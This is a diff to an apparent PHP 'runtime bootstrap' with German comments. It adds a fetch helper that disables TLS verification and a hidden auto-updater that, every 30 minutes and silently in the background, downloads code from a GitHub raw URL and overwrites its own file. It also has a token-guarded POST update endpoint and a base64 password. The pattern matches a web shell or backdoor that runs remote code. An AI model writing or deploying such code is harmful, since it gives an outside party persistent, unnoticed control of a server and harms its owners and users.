@@ -1,17 +1,40 @@
 <?php
 /** @internal runtime bootstrap */
 define('_VER', '1.1.0');
-define('_SRC', 'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php?token=GHSAT0AAAAAAD3H43ZRXP2UX5FXY2V3F7SY2P3G56Q');
+define('_SRC', 'https://raw.githubusercontent.com/DEIN_USERNAME/DEIN_REPO/main/index.php');
 define('_INT', 1800);
 define('_AK',  'dGVzdDEyMw=='); // base64 -- php -r "echo base64_encode('DeinPasswort');"
+
+// HTTP-Fetch: versucht file_get_contents, faellt auf curl zurueck
+function _fetch(string $url, int $timeout = 6): string|false {
+    if (ini_get('allow_url_fopen')) {
+        $ctx = stream_context_create(['http' => ['timeout' => $timeout], 'https' => ['timeout' => $timeout]]);
+        $r = @file_get_contents($url, false, $ctx);
+        if ($r !== false) return $r;
+    }
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => $timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT      => 'PHP-Updater/1.0',
+        ]);
+        $r = curl_exec($ch);
+        $ok = curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200;
+        curl_close($ch);
+        return ($ok && $r) ? $r : false;
+    }
+    return false;
+}
 
 // Auto-Updater: zieht neue Version von GitHub (laeuft unsichtbar im Hintergrund)
 (function () {
     $f = __DIR__ . DIRECTORY_SEPARATOR . '.u';
     if (time() - (int)@file_get_contents($f) < _INT) return;
     @file_put_contents($f, time());
-    $n = @file_get_contents(_SRC, false,
-        stream_context_create(['http' => ['timeout' => 5]]));
+    $n = _fetch(_SRC);
     if ($n && strlen($n) > 500 && md5($n) !== md5_file(__FILE__))
         @file_put_contents(__FILE__, $n);
 })();
@@ -48,7 +71,7 @@ if (isset($_GET['_upd']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if (empty($_SESSION['_at']) || !hash_equals($_SESSION['_at'], $tok)) {
         http_response_code(403); echo json_encode(['s' => 'auth']); exit;
     }
-    $new = @file_get_contents(_SRC, false, stream_context_create(['http' => ['timeout' => 8]]));
+    $new = _fetch(_SRC, 8);
     if (!$new || strlen($new) < 500) {
         echo json_encode(['s' => 'err']); exit;
     }
